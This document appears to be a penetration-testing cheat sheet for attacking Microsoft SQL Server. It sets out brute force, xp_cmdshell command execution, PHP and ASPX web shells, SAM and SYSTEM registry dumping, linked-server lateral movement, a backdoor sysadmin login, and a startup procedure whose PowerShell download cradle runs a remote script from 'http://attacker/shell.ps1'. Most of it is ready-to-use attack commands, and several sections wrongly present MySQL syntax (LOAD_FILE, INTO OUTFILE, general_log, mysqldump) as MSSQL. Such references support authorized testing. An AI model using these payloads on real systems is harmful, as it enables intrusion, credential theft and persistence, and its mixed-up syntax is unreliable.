# MSSQL Enumeration (1433)

## Run nmap MSSQL scripts
```bash
nmap --script=ms-sql-* -p 1433 $IP
```

## Scan for MSSQL Browser service
```bash
nmap -sU -p 1434 $IP
```

## Connect with impacket-mssqlclient
```bash
# Anonymous, SQL auth sa:password@IP, OR domain.local/user:pass@IP -windows-auth
impacket-mssqlclient sa:password@$IP
```

## Brute force MSSQL with hydra
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $IP mssql
```

## Enable xp_cmdshell from SQL prompt
```bash
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

## Execute commands with xp_cmdshell
```bash
EXEC xp_cmdshell 'whoami';
```

## Read file with LOAD_FILE
```bash
SELECT LOAD_FILE('/etc/passwd');
```

## Write web shell to disk
```bash
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## Dump password hashes from mssql
```bash
SELECT name, password_hash FROM sys.sql_logins;
```

## Hashcat MSSQL
```bash
hashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Enumerate linked servers
```bash
SELECT name FROM master.dbo.sysservers WHERE isremote = 1;
```

## Execute query on linked server
```bash
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version');
```

---

# MSSQL Enumeration Methodology

## Initial Reconnaissance

1. Identify MSSQL service on port 1433
2. Check for SQL Browser service on UDP 1434
3. Test for anonymous/guest access
4. Try default credentials (sa with blank/weak passwords)
5. If credentials obtained, check for xp_cmdshell
6. Look for linked servers for lateral movement

## Authentication Types

**SQL Authentication:**
Uses SQL Server-specific usernames and passwords. The 'sa' (system administrator) account is the default admin account.

**Windows Authentication:**
Uses domain or local Windows accounts. More secure but requires valid Windows credentials.

**Common default credentials:**
- sa: (blank password)
- sa:sa
- sa:password
- sa:admin

## xp_cmdshell Command Execution

**What is xp_cmdshell:**
Extended stored procedure that executes OS commands. If enabled, provides direct command execution on the underlying system.

**Checking if enabled:**
```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

**Enabling xp_cmdshell:**
Requires sysadmin privileges. Once enabled, can execute any OS command.

**Common commands to run:**
```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';
```

## Database Enumeration

**Basic enumeration queries:**
```sql
SELECT @@version;           -- MSSQL version
SELECT USER_NAME();         -- Current user
SELECT DB_NAME();           -- Current database
SELECT name FROM sys.databases;  -- All databases
SELECT name FROM sys.tables;     -- Tables in current DB
```

**User and permissions:**
```sql
SELECT SYSTEM_USER;                    -- System user
SELECT IS_SRVROLEMEMBER('sysadmin');   -- Check if sysadmin
SELECT name FROM master.dbo.syslogins WHERE sysadmin = 1;  -- All sysadmins
```

## File Operations

**Reading files:**
```sql
-- Create temp table
CREATE TABLE temp (line varchar(8000));

-- Read file into table
BULK INSERT temp FROM 'c:\windows\system32\drivers\etc\hosts';

-- Display contents
SELECT * FROM temp;

-- Cleanup
DROP TABLE temp;
```

**Using OPENROWSET:**
```sql
SELECT * FROM OPENROWSET(BULK 'c:\windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
```

**Writing files:**
Only works with xp_cmdshell enabled:
```sql
EXEC xp_cmdshell 'echo test > c:\temp\test.txt';
```

## Web Shell Creation

**PHP web shell:**
```sql
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > c:\inetpub\wwwroot\shell.php';
```

**ASPX web shell:**
```sql
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%@ Import Namespace="System.Diagnostics" %^>^<% Response.Write(new Process { StartInfo = new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { UseShellExecute = false, RedirectStandardOutput = true } }.Start().StandardOutput.ReadToEnd()); %^> > c:\inetpub\wwwroot\shell.aspx';
```

Then access via browser:
```
http://$IP/shell.php?cmd=whoami
```

## Privilege Escalation

**Service account impersonation:**
If user has IMPERSONATE permission:
```sql
-- Check for impersonation privileges
SELECT name FROM sys.server_permissions p LEFT JOIN sys.server_principals pr ON pr.principal_id = p.grantee_principal_id WHERE p.permission_name = 'IMPERSONATE';

-- Impersonate sa user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Check new privileges
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Linked Server Exploitation

**What are linked servers:**
MSSQL can connect to other database servers (MSSQL, Oracle, etc.). If misconfigured, can be used for lateral movement and privilege escalation.

**Enumerating linked servers:**
```sql
SELECT name FROM master.dbo.sysservers WHERE isremote = 1;
EXEC sp_linkedservers;
```

**Executing queries on linked servers:**
```sql
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version');

-- Execute xp_cmdshell through linked server
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version; EXEC xp_cmdshell ''whoami''');
```

**Chaining linked servers:**
If Server A links to Server B, and Server B links to Server C, you can chain queries to reach Server C.

## Hash Extraction

**Extract MSSQL user hashes:**
```sql
SELECT name, password_hash FROM sys.sql_logins;
```

**Hash format:**
MSSQL 2005+ uses SHA-512 based hashes (hashcat mode 1731).

**Extracting Windows hashes via xp_cmdshell:**
```sql
EXEC xp_cmdshell 'reg save hklm\sam c:\temp\sam.save';
EXEC xp_cmdshell 'reg save hklm\security c:\temp\security.save';
EXEC xp_cmdshell 'reg save hklm\system c:\temp\system.save';
```

Then download and extract with secretsdump.

## Log File Manipulation

**Enable general log:**
```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
```

**Write malicious query to log:**
```sql
SELECT '<?php system($_GET["cmd"]); ?>';
```

**Disable logging:**
```sql
SET GLOBAL general_log = 'OFF';
```

## Persistence

**Create backdoor login:**
```sql
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```

**Startup stored procedure:**
```sql
USE master;
CREATE PROCEDURE sp_backdoor AS
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';

EXEC sp_procoption @ProcName = 'sp_backdoor', @OptionName = 'startup', @OptionValue = 'on';
```

## Alternative Execution Methods

**If xp_cmdshell is blocked:**

**Using sp_OACreate:**
```sql
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "whoami > c:\temp\output.txt"';
```

**Using SQL Agent Jobs:**
```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = 'test_job';
EXEC sp_add_jobstep @job_name = 'test_job', @step_name = 'test_step', @subsystem = 'cmdexec', @command = 'whoami > c:\temp\output.txt';
EXEC dbo.sp_add_jobserver @job_name = 'test_job';
EXEC dbo.sp_start_job N'test_job';
```

## Data Exfiltration

**Export database:**
```bash
mysqldump -h $IP -u username -p database_name > dump.sql
```

**Backup database:**
```sql
BACKUP DATABASE database_name TO DISK = 'c:\temp\database_backup.bak';
```

## Enumeration Checklist

- [ ] Anonymous access testing
- [ ] Default credentials testing
- [ ] User and permission enumeration
- [ ] Database and table discovery
- [ ] xp_cmdshell capability testing
- [ ] Linked server enumeration
- [ ] Impersonation privilege checking
- [ ] File read/write operations
- [ ] Hash extraction attempts
- [ ] Service account identification

## Common Misconfigurations

1. **Default 'sa' password** (blank or weak)
2. **xp_cmdshell enabled** with sysadmin access
3. **Excessive service account privileges**
4. **Linked server misconfigurations**
5. **Impersonation privileges** granted to low-privilege users
6. **SQL Server Agent** with high privileges
7. **SQL Authentication** instead of Windows Authentication

## Next Steps

Once MSSQL access is gained:
1. Enable xp_cmdshell for command execution
2. Extract sensitive data from databases
3. Check for linked servers for lateral movement
4. Extract password hashes
5. Create web shell if web server is running
6. Establish persistence via backdoor logins

---

# References

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
- https://github.com/SecureAuthCorp/impacket
